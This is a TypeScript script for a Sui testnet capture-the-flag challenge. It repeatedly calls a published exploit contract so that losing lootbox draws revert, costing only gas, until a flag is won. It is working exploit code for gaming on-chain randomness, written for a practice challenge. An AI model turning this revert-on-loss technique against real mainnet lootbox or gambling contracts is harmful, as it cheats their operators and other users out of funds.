import 'dotenv/config';
import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from '../keypair.json' with { type: 'json' };

/**
 * Lootbox CTF: get a flag from the lootbox (1 in 4 chance per attempt).
 * Uses an exploit contract so failed attempts revert and only gas is spent, not 15 USDC.
 *
 * Prereqs:
 * 1. Have testnet SUI for gas.
 * 2. Deploy the exploit (from project root): sui client publish exploit/ --gas-budget 20000000
 * 3. Set EXPLOIT_PACKAGE_ID below (or in .env / export).
 * 4. Have USDC >= 15 (script finds a coin or use USDC_COIN_OBJECT_ID).
 */
const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const REQUIRED_USDC = 15_000_000; // 15 USDC (6 decimals)
const USDC_TYPE =
  '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const GLOBAL_RANDOM_OBJECT = '0x8';

/** Paste the published exploit package ID here after: sui client publish exploit/ --gas-budget 20000000 */
const EXPLOIT_PACKAGE_ID = '0x486dc1a4adba79ef6c2ca1d17cbb8ec8f75d42ede89a66e9cceca4681f71fdea';

function getExploitPackageId(): string {
  const id = (EXPLOIT_PACKAGE_ID || process.env.EXPLOIT_PACKAGE_ID)?.trim();
  if (id) return id;
  throw new Error(
    'Set EXPLOIT_PACKAGE_ID: paste the published package ID at the top of this file (or export EXPLOIT_PACKAGE_ID / .env).\n' +
      '  From project root run: sui client publish exploit/ --gas-budget 20000000'
  );
}

async function getUsdcCoinWithBalance(sender: string): Promise<{ objectId: string; balance: string }> {
  const fromEnv = process.env.USDC_COIN_OBJECT_ID;
  if (fromEnv) {
    const { objects } = await suiClient.listCoins({ owner: sender, coinType: USDC_TYPE, limit: 50 });
    const coin = objects.find((c) => c.objectId === fromEnv);
    if (!coin || BigInt(coin.balance) < REQUIRED_USDC) {
      throw new Error(
        `USDC_COIN_OBJECT_ID ${fromEnv} has insufficient balance. Need ${REQUIRED_USDC} (15 USDC).`
      );
    }
    return coin;
  }

  const { objects } = await suiClient.listCoins({
    owner: sender,
    coinType: USDC_TYPE,
    limit: 50,
  });

  const coin = objects.find((c) => BigInt(c.balance) >= REQUIRED_USDC);
  if (!coin) {
    const total = objects.reduce((sum, c) => sum + BigInt(c.balance), BigInt(0));
    throw new Error(
      `Insufficient USDC. Need ${REQUIRED_USDC} (15 USDC), have ${total}. Get testnet USDC from Circle's faucet.`
    );
  }
  return coin;
}

(async () => {
  const sender = keypair.getPublicKey().toSuiAddress();
  const exploitPackageId = getExploitPackageId();

  let attempt = 0;
  while (true) {
    attempt++;
    const usdcCoin = await getUsdcCoinWithBalance(sender);

    const tx = new Transaction();
    tx.setSender(sender);
    tx.setGasBudget(50_000_000);

    const usdcRef = tx.object(usdcCoin.objectId);
    const [payment] = tx.splitCoins(usdcRef, [REQUIRED_USDC]);
    const random = tx.object(GLOBAL_RANDOM_OBJECT);

    const [flag] = tx.moveCall({
      target: `${exploitPackageId}::lootbox_exploit::exploit`,
      arguments: [payment, random],
    });

    tx.transferObjects([flag], sender);
    tx.transferObjects([usdcRef], sender); // return remaining USDC to sender

    try {
      const result = await suiClient.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        include: { effects: true },
      });

      if (result.$kind === 'FailedTransaction') {
        const failed = result.FailedTransaction;
        const status = failed.status as { error?: { message?: string } } | undefined;
        console.warn(`Attempt ${attempt} failed: ${status?.error?.message ?? 'unknown'}`);
        continue;
      }

      console.log('Flag won after', attempt, 'attempt(s).');
      console.log('Transaction digest:', result.Transaction.digest);
      return;
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      console.warn(`Attempt ${attempt} error: ${msg}`);
      if (msg.includes('InsufficientCoinBalance')) {
        console.warn(
          '→ Likely out of SUI for gas. Each attempt costs gas even when it reverts. Get more from https://faucet.sui.io'
        );
      }
    }
  }
})();